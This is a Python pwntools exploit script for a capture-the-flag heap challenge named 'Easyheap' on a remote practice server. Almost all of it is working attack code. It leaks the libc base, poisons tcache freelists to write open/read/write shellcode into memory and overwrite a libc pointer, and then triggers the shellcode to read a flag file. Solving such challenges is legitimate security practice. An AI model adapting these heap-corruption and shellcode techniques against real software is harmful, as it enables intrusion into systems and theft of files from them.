#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/30 19:06:23
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./Easyheap"
menu = ">> :\n"
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x4f3d5,0x4f432,0x10a41c]
    # libc_path = "../../libc/libc-2.27.so"
    # one_offset = [0x4f2c5,0x4f322,0x10a38c]
else:
    # libc_path = "~/Desktop/pwn/libc/libc-2.27-32.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 29917
    sh = remote(IP,port)
def debug():
    gdb.attach(sh,"0 *0x0x23330000")
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))
def add(size,content):
    cmd(1)
    sh.recvuntil("Size: \n")
    sh.sendline(str(size))
    sh.recvuntil("Content: ")
    sh.send(content)

def dele(idx):
    cmd(2)
    sh.recvuntil("Index:\n")
    sh.sendline(str(idx))

def show(idx):
    cmd(3)
    sh.recvuntil("Index:\n")
    sh.sendline(str(idx))

def edit(idx,content):
    cmd(4)
    sh.recvuntil("Index:\n")
    sh.sendline(str(idx))
    sh.recvuntil("Content:\n")
    sh.send(content)
shellcode = '''
mov rax,0x67616c662f2e
push rax 
mov rdi,rsp
xor rdx,rdx
xor rsi,rsi
mov rax,2
syscall

mov rdi,3
mov rsi,0x23330500
mov rdx,0x30
mov rax,0
syscall
mov rdi,1
mov rax,1
syscall

mov rdi,0
mov rax,60
syscall
'''
ptr = 0x23330000
add(0x500,'a'*0x500) #0
add(0x80,'aaa') #1
add(0x80,'aaa') #2
dele(0)
add(0x20,'a'*8) #0
edit(0,'a'*0x20)
show(0)
sh.recvuntil("a"*0x20)
libc_base = u64(sh.recv(6).ljust(8,"\x00")) - 0x3ebca0
log.info("libc_base=>{}".format(hex(libc_base)))
target = libc_base + 0x61bf60
payload = 'a'*0x10+p64(0)+p64(0x4f1)
edit(0,payload)
add(0x4e0,'./flag'*0x10) #3 
add(0x60,'a'*0x60) #4
add(0x60,'a'*0x60) #5
add(0x60,'a'*0x60) #6
dele(6)
dele(5)
dele(4)
payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(ptr)
edit(3,payload)
add(0x60,'a'*0x60) #4
add(0x60,'a'*0x60) #5
edit(5,asm(shellcode))
add(0x40,'a'*0x20) #6
add(0x20,'a'*0x20) #7
add(0x20,'a'*0x20) #8
dele(8)
dele(7)
payload = 'a'*0x20 + p64(0) + p64(0x21) + p64(target)
edit(6,payload)
add(0x20,'a'*0x20) #7
add(0x20,'a'*0x20) #8
edit(8,p64(ptr))
# debug()
# dele(0)
cmd(5)
sh.interactive()